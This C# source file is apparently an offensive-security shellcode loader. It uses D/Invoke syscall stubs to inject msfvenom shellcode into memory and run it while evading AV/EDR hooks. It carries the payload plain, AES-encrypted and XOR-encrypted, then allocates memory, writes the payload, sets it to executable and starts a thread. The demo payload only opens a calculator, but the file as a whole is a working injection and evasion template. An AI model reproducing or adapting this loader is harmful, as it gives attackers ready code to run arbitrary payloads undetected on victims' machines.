using System;
using System.Runtime.InteropServices;

using DInvoke.DynamicInvoke;
using static Loader.Enums;
using static Loader.Structs;

namespace D_CRT
{
    class Program
    {
        /// <summary>
        /// This program will pop calc using the CreateRemoteThread style of process injection. 
        /// It uses the swaggy D/Invoke to call the unmanged code so we don't get hooked by AV/EDR API hooks.
        /// </summary>

        // SysCall Stubs
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate NtStatus NtOpenProcess(
            ref IntPtr ProcessHandle, 
            UInt32 AccessMask, 
            ref OBJECT_ATTRIBUTES ObjectAttributes, 
            ref CLIENT_ID ClientId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate NtStatus NtAllocateVirtualMemory(
            IntPtr ProcessHandle, 
            ref IntPtr BaseAddress, 
            UInt32 ZeroBits, 
            ref UInt32 RegionSize,
            UInt32 AllocationType, 
            UInt32 Protect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate NtStatus NtWriteVirtualMemory(
            IntPtr ProcessHandle, 
            IntPtr BaseAddress, 
            byte[] Buffer, 
            UInt32 NumberOfBytesToWrite, 
            ref UInt32 NumberOfBytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate NtStatus NtProtectVirtualMemory(
            IntPtr ProcessHandle, 
            ref IntPtr BaseAddress, 
            ref UInt32 NumberOfBytesToProtect, 
            UInt32 NewAccessProtection, 
            ref UInt32 OldAccessProtection);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate NtStatus NtCreateThreadEx(
            ref IntPtr threadHandle, 
            ACCESS_MASK desiredAccess, 
            IntPtr objectAttributes, 
            IntPtr processHandle, 
            IntPtr startAddress, 
            IntPtr parameter, 
            bool inCreateSuspended, 
            Int32 stackZeroBits, 
            Int32 sizeOfStack, 
            Int32 maximumStackSize, 
            IntPtr attributeList);

        static void Main(string[] args)
        {
            // UNENCRYPTED
            // shellcode: msfvenom -p windows/x64/exec CMD="calc.exe" -f csharp
            /*
            byte[] buf = new byte[276] {
                0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
                0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
                0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
                0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
                0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
                0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
                0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
                0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
                0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
                0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
                0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
                0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
                0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
                0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
                0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
                0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
                0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
                0x63,0x2e,0x65,0x78,0x65,0x00 
            };
            */

            // AES DECRYPT
            /*
            byte[] buf = new byte[288] {
0x1f,0x2e,0xc6,0xf8,0xba,0xbb,0xca,0x70,0x56,0x2a,0x48,0xf3,0x07,0x8b,0x37,0x11,
0x16,0xea,0x6e,0x80,0x13,0x52,0x4f,0x24,0x4c,0xde,0xb3,0xba,0x9a,0xea,0x3c,0xc1,
0x2c,0xa2,0x7b,0xb4,0x92,0x1c,0x61,0xbb,0x5b,0xb2,0xa9,0x91,0xc8,0x57,0x4d,0xa6,
0x0c,0x3f,0xb9,0x42,0xe9,0x6f,0x37,0xa8,0xf5,0x55,0xd4,0xc3,0x32,0x5c,0x6d,0x1d,
0x19,0x3a,0xc4,0xcb,0x67,0xa6,0xbd,0x67,0x33,0x45,0xfb,0xab,0x9f,0x6a,0x81,0x0f,
0x91,0x78,0xd7,0xc0,0x3e,0xff,0x0e,0x13,0xbf,0x27,0x85,0x6f,0x29,0xf1,0x04,0x78,
0x62,0x78,0xba,0x48,0x72,0x52,0x94,0xa3,0x4b,0x6c,0x44,0xc5,0xe4,0x76,0xac,0x81,
0xdf,0x68,0x5c,0xd7,0xb8,0x82,0x7d,0xff,0x3d,0x87,0x7e,0xe5,0xb8,0x2d,0xf1,0x9b,
0x51,0x3b,0xc0,0x29,0x2b,0x35,0x8c,0x7a,0x1a,0x23,0xa1,0x0f,0x46,0x76,0xf8,0x32,
0x8d,0x28,0x07,0x79,0xd6,0x3a,0x7f,0x1f,0xcd,0x2f,0xbf,0x44,0xff,0xf4,0x7f,0xbe,
0xd4,0xb3,0x98,0xd9,0x4b,0xd3,0x26,0x3e,0xfb,0x62,0x8e,0x51,0x43,0xa5,0x33,0x7e,
0x1e,0xf7,0x0a,0x6f,0x70,0xab,0xc0,0x8b,0xe9,0xc1,0x86,0x2d,0x79,0xe2,0x3d,0x24,
0x79,0x25,0xc2,0xc5,0x7f,0x0c,0xd6,0x96,0xd0,0x48,0xd8,0x25,0x62,0xbb,0x30,0x9e,
0x6e,0x21,0x02,0xa8,0x61,0x0d,0xcf,0x04,0x8d,0x1b,0xce,0x9f,0x3d,0x68,0x37,0xda,
0x91,0x53,0x90,0x47,0xcb,0x5b,0xda,0x21,0x48,0x25,0x7b,0xe3,0xe1,0x4e,0x27,0x23,
0x9c,0x4b,0x52,0xd9,0xf7,0x7c,0xd9,0x6f,0x81,0x04,0xc0,0xe4,0xcd,0x0b,0xe1,0x89,
0x43,0x58,0x06,0x56,0x30,0x66,0xae,0xa0,0x74,0xbb,0x0d,0x8e,0xdf,0x03,0x21,0x5a,
0xa1,0x42,0x7b,0x28,0xc8,0x55,0xed,0x77,0xe3,0xe1,0x50,0xb3,0xec,0x69,0xa2,0x09 };
            byte[] key = new byte[16] {
0xb8,0xb5,0xfc,0x0a,0xf4,0x76,0xbf,0xcc,0x11,0xf7,0x21,0xa9,0x35,0x97,0x62,0x8f };
            byte[] iv = new byte[16] {
0x11,0x85,0xee,0x5b,0x45,0xe7,0x21,0x2b,0x9d,0x1b,0x9a,0x22,0x15,0xac,0xa3,0x0d };

            buf = Crypto.DecryptFromBytes_AES(buf, key, iv);
            */

            // XOR DECRYPT
            byte[] buf = new byte[276] {
0x22,0xfe,0x8d,0xe4,0x9e,0x78,0x90,0x36,0x47,0x0e,0xac,0x12,0xa8,0x38,0x86,0xaf,
0x88,0xfe,0x3f,0xd2,0x0b,0xd8,0xdb,0x64,0x27,0x46,0x66,0x11,0xf1,0x20,0x5f,0xac,
0xfe,0xfe,0x85,0x72,0x3e,0xd8,0x5f,0x81,0x0d,0x44,0xa0,0x72,0x20,0x20,0xe5,0x3e,
0x72,0x8a,0x6f,0x7c,0x6c,0xbc,0x70,0x77,0x86,0xc7,0xe0,0x02,0xe8,0xa9,0x36,0x13,
0x8c,0xf7,0x5f,0x48,0xe5,0xc2,0x70,0xbd,0x05,0x32,0xa5,0x42,0x39,0xe3,0x54,0x76,
0xde,0xb6,0x0e,0x48,0xeb,0x50,0x24,0x51,0x0f,0x0f,0x3d,0x13,0x62,0x20,0xcc,0xba,
0x55,0xf6,0x2e,0x49,0x6f,0x40,0xb3,0x60,0x0f,0xf1,0x24,0x02,0x62,0x5c,0x5c,0xb6,
0xdf,0x60,0x43,0x31,0xa7,0xd8,0x61,0xf6,0xeb,0x4f,0x2c,0x8a,0xe4,0x29,0xd5,0x3f,
0xe6,0x56,0x7b,0xf1,0x22,0x93,0x1c,0x12,0x4f,0x4b,0xd4,0x92,0x9c,0xb0,0x8c,0xba,
0x55,0xf6,0x2a,0x49,0x6f,0x40,0x36,0x77,0xcc,0x02,0xa5,0x07,0x62,0x28,0xc8,0xb7,
0xdf,0x66,0x4f,0x8b,0x6a,0x18,0x18,0x37,0x97,0x4f,0xb5,0x02,0xb1,0x36,0x8d,0xa4,
0x9f,0xee,0x4f,0x59,0x2f,0xca,0x18,0xb5,0xab,0x2e,0xac,0x11,0x16,0x88,0x8c,0xbf,
0x87,0xec,0x46,0x8b,0x7c,0x79,0x07,0xc9,0xb8,0xf1,0xb0,0x0b,0x53,0x69,0xd4,0xfe,
0xde,0xb6,0x0e,0x00,0x6e,0xd8,0xdd,0xbb,0x46,0x0f,0xed,0x43,0xa8,0xd2,0xe5,0x75,
0xb1,0x31,0xf1,0xd5,0xd5,0x60,0xe5,0x94,0x11,0x4f,0x57,0xe5,0x7c,0xd5,0x49,0x01,
0x0b,0xfe,0x8d,0xc4,0x46,0xac,0x56,0x4a,0x4d,0x8e,0x16,0xa3,0x9c,0x6d,0x6f,0xb9,
0xcd,0xc4,0x61,0x6a,0x6e,0xc9,0x11,0xbf,0x9d,0xf1,0x38,0x20,0x88,0x04,0xb7,0xd0,
0xbb,0xce,0x6b,0x00 };
            byte[] key = new byte[16] {
0xde,0xb6,0x0e,0x00,0x6e,0x90,0x50,0x36,0x47,0x0e,0xed,0x43,0xe9,0x68,0xd4,0xfe };
            buf = Crypto.XOR(buf, key);

            // Classic Process Injection using D/Invoke and syscalls
            Console.WriteLine("[*] Beginning CreateRemoteThread Injection using D/Invoke (swaggy), hit enter to continue...");
            Console.ReadLine();         

            // Open a new process using NtOpenProcess
            Console.WriteLine("[+] Getting memory location of \"NtOpenProcess\" using D/Invoke...");
            IntPtr stub = Generic.GetSyscallStub("NtOpenProcess"); 
            Console.WriteLine("[>] NtOpenProcess memory location: " + string.Format("0x{0:X}", stub.ToInt64()));

            NtOpenProcess ntOpenProcess = (NtOpenProcess)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtOpenProcess)); // our fancy-schmancy new function call
            IntPtr hProc = IntPtr.Zero; // handle to our process
            OBJECT_ATTRIBUTES oAttrributes = new OBJECT_ATTRIBUTES(); // attributes object to fill out (required by NtOpenProcess)
            CLIENT_ID cId = new CLIENT_ID // the process ID (and thread ID) to start the process with
            {
                UniqueProcess = Convert.ToInt32(System.Diagnostics.Process.GetCurrentProcess().Id) // get the current pid
            };

            Console.WriteLine("[+] Calling NtOpenProcess using D/Invoke...");
            NtStatus status = ntOpenProcess(ref hProc, (uint)ACCESS_MASK.GENERIC_ALL, ref oAttrributes, ref cId);
            Console.WriteLine("[>] Process handle: " + string.Format("{0}", hProc.ToInt64()));

            // allocate a region of memory using NtAllocateVirtualMemory
            Console.WriteLine("[+] Getting memory location of \"NtAllocateVirtualMemory\" using D/Invoke...");
            stub = Generic.GetSyscallStub("NtAllocateVirtualMemory");
            Console.WriteLine("[>] NtAllocateVirtualMemory memory location: " + string.Format("0x{0:X}", stub.ToInt64()));
            
            NtAllocateVirtualMemory ntAllocateVirtualMemory = (NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtAllocateVirtualMemory));
            IntPtr hMemory = IntPtr.Zero; // handle to the region of memory to write the shellcode to
            UInt32 regionSize = (UInt32)buf.Length; // length of the shellcode

            Console.WriteLine("[+] Calling NtAllocateVirtualMemory using D/Invoke...");
            status = ntAllocateVirtualMemory(hProc, ref hMemory, 0, ref regionSize, (UInt32)(AllocationType.Commit | AllocationType.Reserve), (UInt32)MemoryProtection.ReadWrite);
            Console.WriteLine("[>] Memory handle: " + string.Format("0x{0:X}", hMemory.ToInt64()));

            // Write the shellcode to the memory
            Console.WriteLine("[+] Getting memory location of \"NtWriteVirtualMemory\" using D/Invoke...");
            stub = Generic.GetSyscallStub("NtWriteVirtualMemory");
            Console.WriteLine("[>] NtWriteVirtualMemory memory location: " + string.Format("0x{0:X}", stub.ToInt64()));

            NtWriteVirtualMemory ntWriteVirtualMemory = (NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtWriteVirtualMemory));
            UInt32 bytesWritten = 0; // the amount of bytes written by ntWriteVirtualMemory

            Console.WriteLine("[+] Calling NtWriteVirtualMemory using D/Invoke...");
            status = ntWriteVirtualMemory(hProc, hMemory, buf, (UInt32)buf.Length, ref bytesWritten);
            Console.WriteLine("[>] Bytes Written: " + string.Format("{0}", bytesWritten));

            // Change the memory protections to RX
            Console.WriteLine("[+] Getting memory location of \"NtProtectVirtualMemory\" using D/Invoke...");
            stub = Generic.GetSyscallStub("NtProtectVirtualMemory");
            Console.WriteLine("[>] NtProtectVirtualMemory memory location: " + string.Format("0x{0:X}", stub.ToInt64()));

            NtProtectVirtualMemory ntProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));
            UInt32 oldProtect = 0; // the old protection value. If we wanted, we could cast this to a MemoryProtection to get the value

            Console.WriteLine("[+] Calling NtProtectVirtualMemory using D/Invoke...");
            status = ntProtectVirtualMemory(hProc, ref hMemory, ref regionSize, (UInt32)MemoryProtection.ExecuteRead, ref oldProtect);
            Console.WriteLine("[>] Changed to RX permissions at memory address: " + string.Format("0x{0:X}", hMemory.ToInt64()));

            // Create a thread to run the shellcode in memory
            Console.WriteLine("[+] Getting memory location of \"NtCreateThreadEx\" using D/Invoke...");
            stub = Generic.GetSyscallStub("NtCreateThreadEx");
            Console.WriteLine("[>] NtCreateThreadEx memory location: " + string.Format("0x{0:X}", stub.ToInt64()));

            NtCreateThreadEx ntCreateThreadEx = (NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtCreateThreadEx));
            IntPtr hThread = IntPtr.Zero; // handle to the new thread


            Console.WriteLine("[+] Calling NtCreateThreadEx using D/Invoke...");
            status = ntCreateThreadEx(ref hThread, ACCESS_MASK.MAXIMUM_ALLOWED, IntPtr.Zero, hProc, hMemory, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
            Console.WriteLine("[>] Created thread at memory location: " + string.Format("0x{0:X}", hMemory.ToInt64()));
            Console.ReadLine();
        }
    }
}
